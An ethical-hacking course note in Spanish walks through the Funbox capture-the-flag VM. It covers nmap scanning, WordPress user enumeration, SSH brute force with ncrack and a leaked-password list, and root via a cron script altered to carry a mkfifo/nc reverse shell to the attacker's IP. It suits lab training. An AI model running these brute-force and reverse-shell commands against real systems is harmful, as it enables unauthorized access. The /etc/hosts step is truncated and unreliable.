---
title: "🖥️ Máquina: Funbox — Hacking Ético"
aliases:
  - Funbox
  - Máquina Funbox
  - VM Funbox
  - Writeup Funbox
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Funbox

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** WEB Attack · Enumeración · Brute Force · Cronjob Exploit · Escalada de privilegios  
> **Descripción:** En esta práctica trabajaremos enumeración web, descubrimiento de usuarios en WordPress, fuerza bruta de SSH y explotación de una tarea programada que permite escalar privilegios hasta root.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / Funbox):** Ej. `10.0.0.24`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Funbox tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Escaneo de red

```bash
nmap -sT -p- 10.0.0.24
```

> [!info] Resultado
> Puertos abiertos: 21 (FTP), 22 (SSH), 80 (HTTP), 33060 (MySQLx)

Escaneo más detallado de servicios principales:

```bash
nmap -A -p21,22,80,33060 10.0.0.24
```

> [!info] Resultado
> Se observa Apache con un robots.txt que apunta a /secret/, además de WordPress en el servidor web.

---

## 🌐 Fase 2: Enumeración Web

Añadimos el dominio al archivo /etc/hosts para resolver correctamente:

```bash
sudo bash -c
```

Comprobamos la instalación de WordPress:

```bash
curl -s http://funbox.fritz.box/ | grep WordPress
```

Con wpscan enumeramos usuarios:

```bash
wpscan --url http://funbox.fritz.box -e ap,t,tt,u
```

> [!info] Resultado
> Se identifican usuarios válidos como admin y joe.

---

## 🔐 Fase 3: Fuerza bruta SSH

Realizamos fuerza bruta sobre uno de los usuarios descubiertos:

```bash
ncrack -u joe -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt ssh://10.0.0.24
```

Cuando obtengas la contraseña válida, conéctate por SSH:

```bash
ssh joe@10.0.0.24
```

---

## 📂 Fase 4: Enumeración local

Revisamos usuarios con shell:

```bash
cat /etc/passwd | grep bash
```

Exploramos la carpeta de otro usuario (funny):

```bash
ls -la /home/funny
```

> [!info] Resultado
> Encontramos el script .backup.sh.

Vemos su contenido:

```bash
cat /home/funny/.backup.sh
```

> [!info] Resultado
> Script que crea un backup de /var/www/html en /home/funny/html.tar.

Comprobamos que se ejecuta periódicamente (tarea programada):

```bash
crontab -u funny -l
```

> [!info] Resultado
> */2 * * * * /home/funny/.backup.sh

---

## 🚀 Fase 5: Explotación del Cronjob

1) En tu Kali, deja el listener preparado con Netcat:

```bash
nc -lvnp 9002
```

2) En la máquina víctima, edita el script del cron:

```bash
nano /home/funny/.backup.sh
```

Añade al final del archivo (sin borrar lo que ya hay) la siguiente línea de reverse shell
(versión con mkfifo, suele funcionar aunque nc -e no esté disponible):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.7 9002 >/tmp/f
```

Guarda con CTRL+o (Enter para confirmar) y sal con CTRL+x.

3) Espera a que el cron ejecute el script y revisa tu terminal de Kali: deberías recibir la shell inversa.

Al ejecutarse la tarea, obtendremos acceso como el usuario funny (cada 2 minutos) o incluso como root (cada 5 minutos).

---

## 🏴‍☠️ Fase 6: Escalada y bandera final

Una vez tengamos shell como root:

```bash
id
```

```bash
cat /root/flag.txt
```

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
